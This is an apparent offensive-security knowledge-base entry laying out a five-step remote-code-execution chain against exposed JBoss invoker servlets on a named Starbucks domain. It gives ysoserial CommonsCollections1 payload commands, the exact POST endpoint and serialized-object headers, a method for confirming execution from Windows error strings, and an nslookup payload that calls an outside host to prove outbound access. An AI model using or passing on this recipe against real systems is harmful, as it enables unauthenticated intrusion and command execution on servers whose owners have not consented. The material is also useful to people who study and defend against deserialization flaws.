---
id: ac-java-deserialization-jboss-rce
tags:
  - rce
  - java-deserialization
  - jboss
  - windows
  - ysoserial
type: attack_chain
tools:
  - '[[tools/ysoserial]]'
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
verified: false
platforms:
  - Web
  - Windows
  - Java
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Discover-Exposed-JBoss-Invoker-Servlets]]'
  - '[[procedures/Generate-Ysoserial-Payload-for-Command-Execution]]'
  - '[[procedures/Craft-and-Send-HTTP-POST-with-Serialized-Payload]]'
  - '[[procedures/Verify-Command-Execution-via-Response-Analysis]]'
  - '[[procedures/Demonstrate-Network-Interaction-with-Nslookup-Payload]]'
step_count: 5
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Windows Command Shell]]'
updated_at: '2025-12-14T17:23:49.148Z'
description: >-
  Multi-stage exploitation of Java deserialization vulnerability in JBoss
  invoker servlets leading to remote command execution on a Windows server.
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Windows Command Shell]]'
---
# Java Deserialization RCE via Exposed JBoss Invoker Servlets

Multi-stage attack chain exploiting a Java deserialization remote code execution (RCE) vulnerability in the JBoss JMXInvokerServlet and EJBInvokerServlet endpoints on card.starbucks.in, allowing arbitrary command execution on the underlying Windows server.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 5 |
| Execution Time | ~10 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Discovery of Exposed Endpoints] --> B[Payload Generation]
    B --> C[Request Crafting and Sending]
    C --> D[Verification of Execution]
    D --> E[Network Interaction Confirmation]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#f39c12
    style D fill:#3498db
    style E fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/ysoserial]]
- [[tools/Burp-Suite]]

### Target Environment

- Target OS/Platform: Windows server running JBoss application server
- Required services/ports: HTTPS (443) with exposed /invoker/ endpoints
- Network access requirements: Direct internet access to the target domain (e.g., card.starbucks.in)

### Initial Access Requirements

- Credential requirements: None (unauthenticated endpoints)
- Network position: External attacker with internet connectivity
- Prior access needed: None

## Detailed Attack Procedures

### Step 1: Discovery of Exposed Endpoints
procedure: [[procedures/Discover-Exposed-JBoss-Invoker-Servlets]]

**Objective**: Identify vulnerable JBoss invoker servlets exposed on the target.

**Instructions**: Manually inspect the target domain for common JBoss paths or use directory enumeration tools to find /invoker/EJBInvokerServlet and /invoker/JMXInvokerServlet. Confirm they accept serialized Java objects by sending a test request.

**Expected Output**: Confirmation of accessible endpoints returning HTTP 200 or similar without authentication.

**Success Indicators**:
- Endpoints respond to GET requests
- No authentication prompts

### Step 2: Payload Generation for Command Execution
procedure: [[procedures/Generate-Ysoserial-Payload-for-Command-Execution]]

**Objective**: Create a serialized Java payload to execute a command like cmd.exe upon deserialization.

**Instructions**: Use [[commands/ysoserial-generate-commonscollections-cmd]] to generate the payload:

```bash
java -jar ysoserial-0.0.4-all.jar CommonsCollections1 'cmd.exe' > serialdata
```

Save the binary output for use in the next step.

**Expected Output**: Binary serialized data file (serialdata) containing the gadget chain payload.

**Success Indicators**:
- File generated without errors
- Binary content verifiable with hexdump or similar

### Step 3: Craft and Send HTTP POST with Serialized Payload
procedure: [[procedures/Craft-and-Send-HTTP-POST-with-Serialized-Payload]]

**Objective**: Deliver the payload to trigger deserialization and command execution.

**Instructions**: In Burp Suite Repeater, set up a POST request to https://card.starbucks.in/invoker/EJBInvokerServlet with Content-Type: application/x-java-serialized-object; class=org.jboss.invocation.MarshalledInvocation. Paste the contents of serialdata as the request body and send.

**Expected Output**: HTTP response from the server, potentially empty or with minimal output due to command execution.

**Success Indicators**:
- Request sent successfully (HTTP 200)
- No deserialization errors in response

### Step 4: Verify Command Execution via Response Analysis
procedure: [[procedures/Verify-Command-Execution-via-Response-Analysis]]

**Objective**: Confirm RCE by testing with a known non-existent command and checking for error strings.

**Instructions**: Generate a test payload with [[commands/ysoserial-generate-commonscollections-fakefile]]:

```bash
java -jar ysoserial-0.0.4-all.jar CommonsCollections1 'fakefile.exe' > serialdata
```

Send via the same POST method and search the response for 'cannot find' or 'The system cannot find the file specified'. Absence in the cmd.exe test confirms execution.

**Expected Output**: Response containing Windows error message for fakefile.exe, but not for cmd.exe.

**Success Indicators**:
- Error string present for fake command
- No error for valid cmd.exe, indicating execution

### Step 5: Demonstrate Network Interaction with Nslookup Payload
procedure: [[procedures/Demonstrate-Network-Interaction-with-Nslookup-Payload]]

**Objective**: Prove outbound network access from the server by triggering a DNS query.

**Instructions**: Generate payload with [[commands/ysoserial-generate-commonscollections-nslookup]]:

```bash
java -jar ysoserial-0.0.4-all.jar CommonsCollections1 'nslookup mealstest.demonsec.us' > serialtest
```

Send via POST, then monitor your DNS server logs using [[commands/sudo-tail-log-messages]]:

```bash
sudo tail -f /var/log/messages
```

**Expected Output**: DNS query log entry from the target's IP.

**Success Indicators**:
- DNS query received on controlled server
- Query matches the nslookup command

## Attack Chain Summary

### Key Achievements

1. Identified and confirmed vulnerable JBoss endpoints
2. Achieved arbitrary command execution on Windows server
3. Demonstrated outbound network connectivity despite egress filtering

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[Windows Command Shell]] Windows Command Shell

### MITRE ATT&CK Tactics

- [[Initial Access]] Initial Access
- [[Execution]] Execution

---

*Last updated: 2023-10-01T00:00:00Z*
